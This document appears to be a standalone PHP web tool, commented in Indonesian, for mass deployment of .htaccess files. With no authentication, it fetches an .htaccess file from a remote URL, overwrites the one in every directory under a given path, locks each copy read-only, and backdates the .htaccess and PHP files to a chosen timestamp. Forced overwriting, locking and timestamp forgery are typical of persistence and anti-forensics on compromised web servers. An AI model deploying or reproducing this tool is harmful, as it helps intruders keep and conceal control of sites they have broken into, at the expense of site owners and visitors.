<?php
// Pengaturan untuk menampilkan error dan flushing
ini_set('display_errors', 1);
error_reporting(E_ALL);
// Naikkan batas memori sebagai pengaman, sesuaikan jika perlu
ini_set('memory_limit', '256M'); 
ob_implicit_flush(true); // Aktifkan flushing output secara otomatis

// ===================================================================
// FUNGSI UTAMA (TETAP SAMA)
// ===================================================================

function fetchFileFromUrl($url) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_USERAGENT => 'Mozilla/5.0'
    ]);
    $data = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ($http_code === 200 && strlen(trim($data)) > 0) ? $data : false;
}

// ===================================================================
// FUNGSI BARU YANG ITERATIF DAN HEMAT MEMORI
// ===================================================================

function processDirectory($targetPath, $htaccessContent, $timestamp) {
    try {
        // Gunakan iterator untuk menjelajahi semua direktori dan subdirektori
        $directoryIterator = new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS);
        $iterator = new RecursiveIteratorIterator($directoryIterator, RecursiveIteratorIterator::SELF_FIRST);

        echo "<div class='info'>--- 🔧 LANGKAH 1: Set Permission & Deploy .htaccess ---</div>";

        foreach ($iterator as $fileInfo) {
            $path = $fileInfo->getPathname();

            if ($fileInfo->isDir()) {
                // Proses untuk direktori
                if (@chmod($path, 0755)) {
                    echo "<div class='success'>✅ Folder chmod 0755: " . htmlspecialchars($path) . "</div>";
                } else {
                    echo "<div class='error'>❌ Gagal chmod folder: " . htmlspecialchars($path) . "</div>";
                }

                // Deploy .htaccess di dalam direktori ini
                $htaccessPath = $path . '/.htaccess';
                if (file_exists($htaccessPath) && !is_writable($htaccessPath)) {
                    @chmod($htaccessPath, 0644); // Coba unlock
                }
                
                if (@file_put_contents($htaccessPath, $htaccessContent) !== false) {
                    echo "<div class='success'>✅ Deployed .htaccess: " . htmlspecialchars($htaccessPath) . "</div>";
                    @chmod($htaccessPath, 0444); // Langsung lock
                    if ($timestamp) @touch($htaccessPath, $timestamp);
                } else {
                    echo "<div class='error'>❌ Gagal deploy ke: " . htmlspecialchars($htaccessPath) . "</div>";
                }

            } elseif ($fileInfo->isFile()) {
                // Proses untuk file
                if ($fileInfo->getFilename() !== '.htaccess') {
                     if (@chmod($path, 0644)) {
                        echo "<div class='success'>✅ File chmod 0644: " . htmlspecialchars($path) . "</div>";
                    } else {
                        echo "<div class='error'>❌ Gagal chmod file: " . htmlspecialchars($path) . "</div>";
                    }
                }
                
                // Set timestamp untuk file PHP jika diminta
                if ($timestamp && $fileInfo->getExtension() === 'php') {
                    @touch($path, $timestamp);
                }
            }
        }
    } catch (Exception $e) {
        echo "<div class='error'>❌ Terjadi Error Saat Memindai Direktori: " . htmlspecialchars($e->getMessage()) . "</div>";
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>🚀 Mass .htaccess Deployment (Optimized)</title>
    <style>
        body { background: #111; color: #eee; font-family: monospace; padding: 20px; }
        input, button { padding: 10px; width: 100%; margin-bottom: 10px; }
        button { background: #0f0; color: #000; font-weight: bold; border: none; cursor: pointer; }
        .log { background: #222; padding: 10px; margin-top: 20px; border-radius: 5px; min-height: 100px; }
        .success { color: #0f0; }
        .error { color: #f33; }
        .info { color: #0af; font-weight: bold; margin-top: 15px; }
    </style>
</head>
<body>
    <h2>🚀 Mass .htaccess Deployment (Optimized)</h2>
    
    <?php if ($_SERVER['REQUEST_METHOD'] !== 'POST'): ?>
    <form method="POST">
        <label>🎯 Target Path:</label>
        <input type="text" name="target_path" placeholder="/var/www/html" required>
        <label>🌐 URL .htaccess (GitHub raw, dll):</label>
        <input type="text" name="htaccess_url" placeholder="https://raw.githubusercontent.com/.../.htaccess" required>
        <label>⏱️ Timestamp (YYYY-MM-DD HH:MM:SS):</label>
        <input type="text" name="timestamp" placeholder="2024-01-01 00:00:00 (opsional)">
        <button type="submit">🚀 Deploy Sekarang</button>
    </form>
    <?php endif; ?>

    <div class="log">
        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            echo "<h3>Proses Dimulai...</h3>";

            $targetPath = rtrim($_POST['target_path'], '/');
            $url = $_POST['htaccess_url'];
            $timestamp = !empty($_POST['timestamp']) ? strtotime($_POST['timestamp']) : false;

            if (!is_dir($targetPath)) {
                echo "<div class='error'>❌ Target path not found: " . htmlspecialchars($targetPath) . "</div>";
            } else {
                $htaccessContent = fetchFileFromUrl($url);
                if (!$htaccessContent) {
                    echo "<div class='error'>❌ Gagal ambil isi .htaccess dari URL.</div>";
                } else {
                    // Panggil fungsi iteratif yang baru
                    processDirectory($targetPath, $htaccessContent, $timestamp);
                    echo "<h3 style='color:#0f0;'>✅ Proses Selesai.</h3>";
                }
            }
        }
        ?>
    </div>
</body>
</html>
